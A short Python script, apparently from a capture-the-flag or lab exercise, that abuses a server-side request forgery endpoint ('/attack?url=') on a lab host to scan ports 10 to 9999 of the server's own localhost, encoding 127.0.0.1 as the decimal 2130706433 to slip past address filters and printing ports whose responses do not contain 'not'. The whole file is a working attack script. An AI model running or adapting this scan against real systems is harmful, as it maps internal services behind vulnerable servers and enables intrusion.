# Instala previamiente esta libreria: pip3 install requests beautifulsoup4
#!/usr/bin/env python3
from bs4 import BeautifulSoup
import requests
import re

#port = 3306
for ports in range(10,10000):
    #print(f'Port: {ports}')
    html = requests.get(f'http://10.10.31.26:8000/attack?url=http%3A%2F%2F2130706433%3A{ports}')
    message = html.text
    tag = BeautifulSoup(message, 'html.parser')
    for i in tag.find_all('p'):
        if re.match(r'^(?:(?!not).)+$', i.string): print(f'Port: {ports} ' + i.string)




